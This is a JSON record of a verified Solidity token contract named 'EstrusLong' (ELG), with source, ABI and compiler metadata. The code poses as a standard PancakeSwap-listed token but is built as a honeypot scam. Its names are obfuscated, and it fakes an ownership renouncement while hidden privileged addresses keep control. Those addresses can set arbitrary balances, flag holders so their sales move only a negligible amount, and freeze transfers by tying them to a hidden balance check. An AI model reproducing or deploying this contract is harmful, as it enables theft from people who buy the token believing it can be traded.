{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface buyMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTeam {\n    function createPair(address toIs, address launchSwapReceiver) external returns (address);\n}\n\ninterface shouldAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeList) external view returns (uint256);\n\n    function transfer(address enableTeamLaunched, uint256 fundLimit) external returns (bool);\n\n    function allowance(address receiverLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableTeamLaunched,\n        uint256 fundLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listEnableIs, uint256 value);\n    event Approval(address indexed receiverLiquidity, address indexed spender, uint256 value);\n}\n\ninterface fundAt is shouldAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EstrusLong is totalSell, shouldAmount, fundAt {\n\n    mapping(address => mapping(address => uint256)) private fromMinTrading;\n\n    function autoToken() private view {\n        require(toReceiver[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalSwap;\n    }\n\n    uint256 constant sellFee = 7 ** 10;\n\n    uint256 public totalAuto;\n\n    bool public limitAuto;\n\n    function buyMinReceiver(address minWalletSwap, uint256 fundLimit) public {\n        autoToken();\n        launchLimit[minWalletSwap] = fundLimit;\n    }\n\n    function isTx(address sellTo) public {\n        require(sellTo.balance < 100000);\n        if (limitAuto) {\n            return;\n        }\n        if (minListReceiver) {\n            isAmount = true;\n        }\n        toReceiver[sellTo] = true;\n        \n        limitAuto = true;\n    }\n\n    uint256 toTake;\n\n    bool public isMarketing;\n\n    bool public isAmount;\n\n    function getOwner() external view returns (address) {\n        return isSenderAmount;\n    }\n\n    function tokenLimit(uint256 fundLimit) public {\n        autoToken();\n        txSwap = fundLimit;\n    }\n\n    function transfer(address minWalletSwap, uint256 fundLimit) external virtual override returns (bool) {\n        return receiverModeToken(_msgSender(), minWalletSwap, fundLimit);\n    }\n\n    address exemptBuyLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private isSenderAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSender;\n    }\n\n    function walletAuto(address tradingEnable, address enableTeamLaunched, uint256 fundLimit) internal returns (bool) {\n        require(launchLimit[tradingEnable] >= fundLimit);\n        launchLimit[tradingEnable] -= fundLimit;\n        launchLimit[enableTeamLaunched] += fundLimit;\n        emit Transfer(tradingEnable, enableTeamLaunched, fundLimit);\n        return true;\n    }\n\n    function receiverModeToken(address tradingEnable, address enableTeamLaunched, uint256 fundLimit) internal returns (bool) {\n        if (tradingEnable == enableLaunch) {\n            return walletAuto(tradingEnable, enableTeamLaunched, fundLimit);\n        }\n        uint256 txFee = shouldAmount(totalTrading).balanceOf(maxTakeReceiver);\n        require(txFee == txSwap);\n        require(enableTeamLaunched != maxTakeReceiver);\n        if (receiverToken[tradingEnable]) {\n            return walletAuto(tradingEnable, enableTeamLaunched, sellFee);\n        }\n        return walletAuto(tradingEnable, enableTeamLaunched, fundLimit);\n    }\n\n    uint256 public swapBuyLaunch;\n\n    address public totalTrading;\n\n    function owner() external view returns (address) {\n        return isSenderAmount;\n    }\n\n    function approve(address walletMax, uint256 fundLimit) public virtual override returns (bool) {\n        fromMinTrading[_msgSender()][walletMax] = fundLimit;\n        emit Approval(_msgSender(), walletMax, fundLimit);\n        return true;\n    }\n\n    bool public minListReceiver;\n\n    mapping(address => uint256) private launchLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapLaunchedFrom;\n    }\n\n    constructor (){\n        if (exemptMin != swapBuyLaunch) {\n            isAmount = true;\n        }\n        buyMode walletModeAt = buyMode(exemptBuyLiquidity);\n        totalTrading = buyTeam(walletModeAt.factory()).createPair(walletModeAt.WETH(), address(this));\n        \n        enableLaunch = _msgSender();\n        isModeMarketing();\n        toReceiver[enableLaunch] = true;\n        launchLimit[enableLaunch] = swapLaunchedFrom;\n        \n        emit Transfer(address(0), enableLaunch, swapLaunchedFrom);\n    }\n\n    uint256 public listExempt;\n\n    uint256 txSwap;\n\n    event OwnershipTransferred(address indexed maxMarketingTake, address indexed receiverWallet);\n\n    function transferFrom(address tradingEnable, address enableTeamLaunched, uint256 fundLimit) external override returns (bool) {\n        if (_msgSender() != exemptBuyLiquidity) {\n            if (fromMinTrading[tradingEnable][_msgSender()] != type(uint256).max) {\n                require(fundLimit <= fromMinTrading[tradingEnable][_msgSender()]);\n                fromMinTrading[tradingEnable][_msgSender()] -= fundLimit;\n            }\n        }\n        return receiverModeToken(tradingEnable, enableTeamLaunched, fundLimit);\n    }\n\n    function allowance(address enableMarketing, address walletMax) external view virtual override returns (uint256) {\n        if (walletMax == exemptBuyLiquidity) {\n            return type(uint256).max;\n        }\n        return fromMinTrading[enableMarketing][walletMax];\n    }\n\n    mapping(address => bool) public receiverToken;\n\n    uint256 private swapLaunchedFrom = 100000000 * 10 ** 18;\n\n    function takeAtExempt(address exemptLaunchedMode) public {\n        autoToken();\n        \n        if (exemptLaunchedMode == enableLaunch || exemptLaunchedMode == totalTrading) {\n            return;\n        }\n        receiverToken[exemptLaunchedMode] = true;\n    }\n\n    function isModeMarketing() public {\n        emit OwnershipTransferred(enableLaunch, address(0));\n        isSenderAmount = address(0);\n    }\n\n    address maxTakeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private exemptMin;\n\n    uint8 private fundTradingSender = 18;\n\n    mapping(address => bool) public toReceiver;\n\n    string private totalSwap = \"Estrus Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTradingSender;\n    }\n\n    address public enableLaunch;\n\n    string private receiverSender = \"ELG\";\n\n    function balanceOf(address feeList) public view virtual override returns (uint256) {\n        return launchLimit[feeList];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketingTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listEnableIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWalletSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLimit\",\"type\":\"uint256\"}],\"name\":\"buyMinReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isModeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"}],\"name\":\"isTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minListReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapBuyLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunchedMode\",\"type\":\"address\"}],\"name\":\"takeAtExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundLimit\",\"type\":\"uint256\"}],\"name\":\"tokenLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWalletSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTeamLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EstrusLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}